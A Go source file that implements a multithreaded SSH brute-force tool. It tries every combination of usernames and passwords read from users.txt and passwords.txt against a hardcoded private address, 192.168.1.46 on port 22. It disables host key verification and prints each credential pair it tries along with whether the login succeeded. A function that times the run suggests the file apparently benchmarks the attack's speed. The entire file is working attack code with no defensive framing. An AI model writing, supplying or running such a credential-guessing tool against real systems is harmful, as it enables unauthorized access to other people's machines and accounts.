package main

import (
	"bufio"
	"fmt"
	"net"
	"os"
	"runtime"
	"strconv"
	"sync"
	"time"

	"golang.org/x/crypto/ssh"
)

func check(e error) {
	if e != nil {
		panic(e)
	}
}

type login struct {
	user string
	pass string
	pos  string
}

var wg sync.WaitGroup

//Read2Files read 2 files to itter between them
func Read2Files(userFile, passFile string, loginChan chan login) {

	f1, err := os.Open(userFile)
	check(err)
	f2, err := os.Open(passFile)
	check(err)

	defer func() {
		f1.Close()
		f2.Close()
		close(loginChan)
	}()

	ureader := bufio.NewScanner(f1)
	preader := bufio.NewScanner(f2)

	var userList []string
	for i := 0; preader.Scan(); i++ {
		if i == 0 {
			for j := 0; ureader.Scan(); j++ {
				userList = append(userList, ureader.Text())
				loginChan <- login{user: userList[len(userList)-1], pass: preader.Text(), pos: strconv.Itoa(i) + "-" + strconv.Itoa(j)}
			}

			if err := ureader.Err(); err != nil {
				check(err)
			}
		} else {
			for j, u := range userList {
				loginChan <- login{user: u, pass: preader.Text(), pos: strconv.Itoa(i) + "-" + strconv.Itoa(j)}
			}
		}
	}
	if err := preader.Err(); err != nil {
		check(err)
	}

}

//workSSH goroutine for one attack of SSH
func workSSH(job login) {
	// fmt.Println(yellow("[attemp] ", job.pos, " ", job.user, ":", job.pass))
	defer wg.Done()
	//SSH basic connection
	config := &ssh.ClientConfig{
		User: job.user,
		Auth: []ssh.AuthMethod{
			ssh.Password(job.pass),
		},
		HostKeyCallback: ssh.InsecureIgnoreHostKey(),
	}

	//Recover function
	defer func() {
		r := recover()
		if r != nil {
			fmt.Println(r)
		}
	}()

	t := net.JoinHostPort("192.168.1.46", "22")

	_, err := ssh.Dial("tcp", t, config)

	if err != nil {
		fmt.Println("[X] Failed to connect ", job.pos, " at ", t, " ", job.user, ":", job.pass)
	} else {
		fmt.Println("[+][+] Session Connect ", job.pos, " at ", t, " ", job.user, ":", job.pass)
	}
}

//SSHattackStart SSH attack with 2 files to iterate
func SSHattackStart(userFile, passFile string, nWorkers int) {
	if nWorkers == 0 {
		nWorkers = 9
	}

	outchan := make(chan login, nWorkers)
	go Read2Files(userFile, passFile, outchan)
	var sem = make(chan int, nWorkers)
	for i := 0; i < nWorkers; i++ {
		sem <- 1
	}
	for {
		select {
		case job, ok := <-outchan:
			if !ok {
				wg.Wait()
				fmt.Sprintln("[info] jobs finisished")
				return
			}
			wg.Add(1)
			<-sem
			go func(job login) {
				workSSH(job)
				sem <- 1
			}(job)
		}
	}
}

func Use_model1() time.Duration {
	numWorkers := runtime.NumCPU()
	start := time.Now()
	SSHattackStart("users.txt", "passwords.txt", numWorkers)
	return time.Since(start)
}
